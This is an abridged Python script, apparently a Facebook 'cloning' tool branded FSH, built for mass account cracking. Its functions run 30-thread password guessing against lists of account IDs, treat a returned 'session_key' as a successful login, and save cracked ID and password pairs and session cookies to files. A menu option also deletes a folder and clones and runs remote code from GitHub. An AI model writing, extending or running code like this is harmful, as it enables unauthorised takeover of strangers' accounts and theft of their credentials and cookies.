...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS FSH ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
888       Y88b.      888    888 
8888888    "Y888b.   8888888888 
888           "Y88b. 888    888 
888             "888 888    888 
888       Y88b  d88P 888    888 
888        "Y8888P"  888    888
                                          \033[1;32mFSH\033[1;37m 
====================================================
[+] OWNER      : FARiS KHAN
[+] GITHUB     : TAYAB-KHAN
[+] STATUS     : FREE
...
def FSH():
		clear()
		print(f'\033[1;37m [1] File Cloning (\033[1;32m \033[1;37m )\n [2] Random Cloning \n [3] Gmail Cloning (ON) \n [4] Create File \n [0] Exit')
		linex()
		shm= input('\033[1;37m [+] Select option: ')
		if shm =='1':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100000393670554//")
			file_crack()
		elif shm =='2':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100000393670554")
			r_crack()
			...
			clear()
			os.system('rm -rf Dump && git clone https://github.com/FSH-KHAN/Dump.git && cd Dump && python Dump.py')
		elif shm =='5':
			...
			os.system('xdg-open https://chat.whatsapp.com/ENIBC9FIB')
			FSH()
		elif shm =='0':
...
def file_crack():
	...
	with tred(max_workers=30) as FSH:
		clear()
		tl = str(len(fo))
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In FSH Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				FSH.submit(api1,ids,names,passlist)
			else:
				FSH.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as FSH:
		...
		print("\33[1;37m [+] Use flight mode for speed up\033[1;37m")
		print("\33[1;37m [+] Your Cp/Ok Id Save In FARIS_KHAN Folder")
		linex()
		for psx in user:
			ids = code+psx
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ FSH ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[FSH-OK] '+uid+' | '+pas)		                    
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'FSH_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'FSH_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [FSH-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'FSH-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ FSH-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [FSH-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'FSH_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
